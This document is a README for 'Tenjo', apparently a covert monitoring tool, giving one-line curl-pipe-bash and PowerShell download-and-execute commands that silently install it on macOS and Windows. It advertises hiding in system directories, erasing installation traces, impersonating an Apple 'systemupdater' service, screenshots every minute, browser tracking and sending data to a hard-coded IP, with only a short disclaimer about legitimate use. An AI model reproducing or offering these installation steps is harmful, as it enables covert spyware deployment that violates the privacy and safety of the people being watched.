# Tenjo Stealth Installation Commands

## One-Line Remote Installation (Stealth Mode)

### macOS - Silent Installation
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_install_stealth_macos.sh | bash -s true
```

### Windows - Silent Installation
```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_install_stealth_windows.bat' -OutFile '%TEMP%\quick_install.bat' -UseBasicParsing; cmd /c '%TEMP%\quick_install.bat' true; del '%TEMP%\quick_install.bat'"
```

## Manual Installation (if needed)

### macOS
1. Download repository
2. Navigate to client directory
3. Run: `bash quick_install_stealth_macos.sh true`

### Windows
1. Download repository
2. Navigate to client directory
3. Run: `quick_install_stealth_windows.bat true`

## Uninstallation Commands

### macOS - One-Line Remote Uninstall
```bash
curl -s https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_uninstall_stealth_macos.sh | bash
```

### Windows - One-Line Remote Uninstall
```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_uninstall_stealth_windows.bat' -OutFile '%TEMP%\quick_uninstall.bat' -UseBasicParsing; cmd /c '%TEMP%\quick_uninstall.bat'; del '%TEMP%\quick_uninstall.bat'"
```

### Manual Uninstall (if needed)

#### macOS
```bash
bash quick_uninstall_stealth_macos.sh
```

#### Windows
```cmd
quick_uninstall_stealth_windows.bat
```

## Features

### ✅ Completely Silent Operation
- No user prompts or visible windows
- Runs hidden in background
- Auto-starts on boot/login
- No taskbar or system tray icons

### ✅ Stealth Installation
- Downloads and installs automatically
- Hides in system directories
- Removes installation traces
- Uses system service names

### ✅ Auto-Start Configuration
- **macOS**: LaunchAgent/LaunchDaemon
- **Windows**: Task Scheduler
- Starts automatically when computer boots
- Survives user logout/login

### ✅ Monitoring Capabilities
- 📸 Screenshots every 60 seconds
- 🌐 Browser activity tracking
- 💻 Process monitoring
- 📊 System statistics
- 📡 Data transmission to server

### ✅ Professional Disguise
- Service name: "SystemUpdate"
- Appears as legitimate system service
- Hidden from casual inspection
- Low resource usage

## Installation Locations

### macOS
- **Install Dir**: `~/.config/system-utils/`
- **Service**: `~/Library/LaunchAgents/com.apple.systemupdater.plist`
- **Logs**: `~/Library/Logs/SystemUpdater/`

### Windows  
- **Install Dir**: `%USERPROFILE%\.config\system-utils\`
- **Task**: Task Scheduler `SystemUpdater`
- **Logs**: `%USERPROFILE%\AppData\Local\SystemUpdater\`

## Uninstall Features

### ✅ Complete Removal
- Stops all running processes
- Removes auto-start configuration
- Deletes all files and logs
- Cleans system traces
- Verifies successful removal

### ✅ One-Line Remote Uninstall
- No need to access target machine locally
- Downloads and runs uninstaller automatically
- Works from any terminal with internet access
- Provides detailed removal report

## Security Notes

⚠️ **This is monitoring software intended for legitimate employee monitoring purposes only**

- Only use on systems you own or have explicit permission to monitor
- Ensure compliance with local privacy laws
- Inform users of monitoring where legally required
- Use responsibly and ethically

## Technical Details

### Process Names
- **Main Process**: `python stealth_main.py`
- **Service Name**: `SystemUpdater` / `com.apple.systemupdater`
- **Directory Name**: `system-utils` / `.config/system-utils`

### Network Communication
- Connects to: `http://103.129.149.67`
- Encrypted data transmission
- Automatic retry on connection failure
- Minimal bandwidth usage

### Logging
- Silent mode: Warnings and errors only
- Log location: `logs/stealth.log`
- Automatic log rotation
- No console output in stealth mode
